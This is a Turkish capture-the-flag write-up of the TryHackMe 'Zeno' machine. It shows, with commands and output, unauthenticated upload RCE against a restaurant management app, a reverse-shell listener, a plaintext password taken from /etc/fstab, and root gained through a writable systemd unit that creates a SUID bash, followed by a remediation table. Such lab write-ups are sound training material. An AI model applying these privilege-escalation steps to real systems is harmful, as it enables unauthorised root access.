# 🏛️ Zeno — TryHackMe Writeup

![Zorluk](https://img.shields.io/badge/Zorluk-Orta-orange)
![Kategori](https://img.shields.io/badge/Kategori-Web%20|%20RCE%20|%20Systemd%20Abuse-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-green)

> **Yazar:** Miraç Akkuş (LatenT)  
> **Tarih:** Mayıs 2026

---

## 🚩 Flag'ler

| Flag | Konum | Değer |
|------|-------|-------|
| **User Flag** | `/home/edward/user.txt` | `THM{GO GET IT}` |
| **Root Flag** | `/root/root.txt` | `THM{GO GET İT}` |

---

## 📋 Olay Özeti

Zeno, Pathfinder Hotel Restaurant Management System üzerinden kimlik doğrulamasız dosya upload ile başlayan, ardından `/etc/fstab`'ta düz metin parola bulma ve son olarak yazılabilir systemd unit file + reboot yetkisi ile root alınan klasik bir zincir.

---

## 🔍 Keşif

```bash
rustscan <IP>
nmap -p22,12340 -sV <IP>
```

| Port | Servis | Versiyon |
|------|--------|----------|
| 22 | SSH | OpenSSH 7.4 |
| 12340 | HTTP | Apache 2.4.6, PHP 5.4.16 |

```bash
gobuster dir -u http://<IP>:12340 -w directory-list-2.3-medium.txt
```

**Bulgu:** `/rms/` — Pathfinder Hotel Restaurant Management System

Google'da "Restaurant Management System PHP vulnerabilities" araması: [XSS](https://www.sevenlayers.com/index.php/264-restaurant-management-system-1-0-xss-session-hijack), [arbitrary file upload](https://www.sevenlayers.com/index.php/265-restaurant-management-system-1-0-arbitrary-file-upload), [RCE](https://www.exploit-db.com/exploits/47520).

---

## 🌐 İlk Erişim: Kimlik Doğrulamasız RCE

Exploit-db'deki script hardcoded session cookie kullanıyor — bu aslında auth gerektirmediğini gösteriyor. Script biraz karışık olduğu için sadeleştirilmiş versiyon kullandım ([rms_exploit.py](./rms_exploit.py)).

```bash
# LHOST, RHOST, RPORT ayarla (satır 11-13)
python3 rms_exploit.py
```

Dinleyici:

```bash
nc -lnvp 4444
```

**Kabuk:**
```bash
sh-4.2$ id
uid=48(apache) gid=48(apache)
```

---

## 🚀 PrivEsc: apache → edward

Linpeas çalıştırıldı. Bulgular:

- Yazılabilir unit file: `/etc/systemd/system/zeno-monitoring.service`
- Düz metin parola: `/etc/fstab` içinde "zeno" kullanıcısı için

```bash
cat /etc/fstab
# zeno:<PAROLA> formatında

su edward
# Parola: /etc/fstab'taki değer

id
uid=1000(edward)
```

**User flag:** `/home/edward/user.txt`

Aynı parola SSH ile de çalışıyor.

---

## 🏁 PrivEsc: edward → root

```bash
sudo -l
```

```
User edward may run the following commands on zeno:
    (ALL) NOPASSWD: /usr/sbin/reboot
```

**Plan:** Yazılabilir `zeno-monitoring.service`'i değiştir, reboot et, SUID bash al.

### Unit File Değiştirme

```bash
cat /etc/systemd/system/zeno-monitoring.service
```

```ini
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "cp /home/edward/bd /tmp/bd && chmod u+s /home/edward/bd"

[Install]
WantedBy=multi-user.target
```

### Backdoor Oluşturma ve Reboot

```bash
# /home/edward/bd'yi oluştur (bash kopyası)
cp /bin/bash /home/edward/bd

# Reboot ile root olarak çalıştır
sudo /usr/sbin/reboot
```

### Root Kabuğu

Reboot sonrası:

```bash
ls -l /home/edward/bd
-rwsr-xr-x. 1 root root 964536 bd

./bd -p
bd-4.2# whoami
root
```

**Root flag:** `/root/root.txt`

---

## 🗺️ Zincir Özeti

```
[/rms/ → Restaurant Management System]
    │
    ▼
[Kimlik doğrulamasız file upload RCE]
    │
    ▼
[apache shell]
    │
    ▼
[Linpeas → /etc/fstab parola]
    │
    ▼
[su edward]
    │
    ▼
[User flag]
    │
    ▼
[sudo -l: reboot NOPASSWD]
    │
    ▼
[zeno-monitoring.service yazılabilir]
    │
    ▼
[ExecStart → SUID bash]
    │
    ▼
[sudo reboot]
    │
    ▼
[./bd -p → root]
    │
    ▼
[Root flag]
```

---

## 🛡️ Çözümler

| # | Zafiyet | Çözüm |
|---|---------|-------|
| 1 | Kimlik doğrulamasız file upload | Upload dizinini auth ile koru; uzantı whitelist |
| 2 | Düz metin parola (/etc/fstab) | Şifrele; secrets management kullan |
| 3 | Yazılabilir systemd unit | Dosya izinleri; root sahipliği |
| 4 | NOPASSWD reboot | Kaldır; veya emergency mode kısıtla |

---

## 🎓 Çıkarımlar

1. **Kimlik doğrulamasız upload = altın** — Exploit-db scripti cookie hardcode ediyorsa, muhtemelen auth gerekmiyordur
2. **Linpeas her zaman çalıştır** — `/etc/fstab`'ta parola bulmak klasik ama etkili
3. **Yazılabilir systemd unit = root** — `ExecStart` root olarak çalışır, reboot yetkisi yeterli
4. **SUID bash `-p` ile** — `-p` olmadan yetki düşer, unutma

---

**Yazan:** LatenT  
**Tarih:** Mayıs 2026
